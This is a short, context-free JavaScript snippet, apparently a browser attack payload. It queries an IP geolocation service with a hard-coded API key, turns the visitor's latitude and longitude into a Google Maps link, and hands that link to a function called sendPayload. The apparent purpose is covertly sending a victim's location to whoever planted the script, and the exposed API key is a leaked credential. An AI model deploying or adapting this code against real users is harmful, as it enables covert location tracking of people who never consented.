var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        var obj = JSON.parse(this.responseText);         
        sendPayload("https://www.google.com/maps/@" + obj.latitude + "," + obj.longitude + ",15z")        
    }
  };
xhttp.open("GET", "https://api.ipgeolocation.io/ipgeo?apiKey=3d1fb5242e9349ea9e96fef8989efb63", true);                   
xhttp.send();
